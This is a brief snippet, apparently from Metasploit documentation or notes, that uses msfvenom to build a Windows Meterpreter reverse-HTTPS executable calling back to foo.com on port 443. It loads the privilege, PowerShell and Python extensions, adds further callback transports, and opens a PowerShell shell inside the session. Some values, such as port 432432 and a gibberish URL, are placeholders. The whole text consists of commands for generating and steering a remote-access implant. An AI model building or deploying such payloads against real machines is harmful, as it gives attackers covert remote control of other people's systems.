msfvenom -p windows/meterpreter_reverse_https LHOST=foo.com LPORT=443 EXTENSIONS=stdapi,priv,powershell,python EXTINIT=powershell,/tmp/addtransports.ps1:python,/tmp/foo.py -o /tmp/output.exe

Add-WebTransport -Url https://fddfjsdlfds
Add-TcpTransport -Host bar.com -Port 432432

meterpreter> powershell_shell
PS> Get-Help Add-WebTransport -Full

